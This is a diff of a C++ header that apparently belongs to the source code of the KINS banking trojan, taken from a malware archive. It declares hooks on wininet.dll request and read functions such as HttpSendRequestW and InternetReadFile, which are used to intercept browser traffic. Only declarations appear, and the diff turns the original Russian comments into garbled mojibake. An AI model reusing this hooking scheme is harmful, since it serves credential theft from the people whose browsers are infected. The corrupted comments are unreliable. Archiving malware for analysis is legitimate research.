@@ -1,58 +1,69 @@
 /*
-Перехват wininet.dll
+  name      KINS
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     вЂ”
+ */
+/*
+пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ wininet.dll
 */
 #pragma once
 
 namespace WininetHook
 {
 	/*
-	Инициализация.
+	пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
 	*/
 	void init(void);
 
 	/*
-	Деинициализация.
+	пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 	*/
 	void uninit(void);
 
 	/*
-	Перехватчик HttpSendRequestW.
+	пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ HttpSendRequestW.
 	*/
 	BOOL WINAPI hookerHttpSendRequestW(HINTERNET request, LPWSTR headers, DWORD headersLength, LPVOID optional, DWORD optionalLength);
 
 	/*
-	Перехватчик HttpSendRequestA.
+	пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ HttpSendRequestA.
 	*/
 	BOOL WINAPI hookerHttpSendRequestA(HINTERNET request, LPSTR headers, DWORD headersLength, LPVOID optional, DWORD optionalLength);
 
 	/*
-	Перехватчик HttpSendRequestExW.
+	пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ HttpSendRequestExW.
 	*/
 	BOOL WINAPI hookerHttpSendRequestExW(HINTERNET request, LPINTERNET_BUFFERSW buffersIn, LPINTERNET_BUFFERSW buffersOut, DWORD flags, DWORD_PTR context);
 
 	/*
-	Перехватчик HttpSendRequestExA.
+	пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ HttpSendRequestExA.
 	*/
 	BOOL WINAPI hookerHttpSendRequestExA(HINTERNET request, LPINTERNET_BUFFERSA buffersIn, LPINTERNET_BUFFERSA buffersOut, DWORD flags, DWORD_PTR context);
 
 	/*
-	Перехватчик InternetCloseHandle.
+	пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ InternetCloseHandle.
 	*/
 	BOOL WINAPI hookerInternetCloseHandle(HINTERNET handle);
 
 	/*
-	Перехватчик InternetReadFile.
+	пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ InternetReadFile.
 	*/
 	BOOL WINAPI hookerInternetReadFile(HINTERNET handle, LPVOID buffer, DWORD numberOfBytesToRead, LPDWORD numberOfBytesReaded);
 
 	/*
-	Перехватчик InternetReadFileExA. Также вызывается от InternetReadFileExW
+	пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ InternetReadFileExA. пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ InternetReadFileExW
 	*/
 	BOOL WINAPI hookerInternetReadFileExA(HINTERNET handle, LPINTERNET_BUFFERSA buffersOut, DWORD flags, DWORD_PTR context);
 
 	/*
-	Перехватчик InternetQueryDataAvailable.
+	пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ InternetQueryDataAvailable.
 	*/
 	BOOL WINAPI hookerInternetQueryDataAvailable(HINTERNET handle, LPDWORD numberOfBytesAvailable, DWORD flags, DWORD_PTR context);
 };
